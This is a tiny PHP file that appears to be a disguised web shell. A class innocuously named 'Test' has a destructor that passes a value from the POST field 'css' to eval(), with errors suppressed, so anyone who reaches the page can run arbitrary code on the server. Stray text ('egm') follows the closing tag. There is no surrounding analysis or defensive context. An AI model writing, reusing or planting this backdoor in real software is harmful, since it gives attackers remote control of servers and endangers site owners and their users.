<?php
class  Test{
    public $name = '';
    function __destruct(){
        @eval("$this->name");
    }
} 
$test= new Test();
$c = @$_POST['css'];
$test->name = $c;
?>egm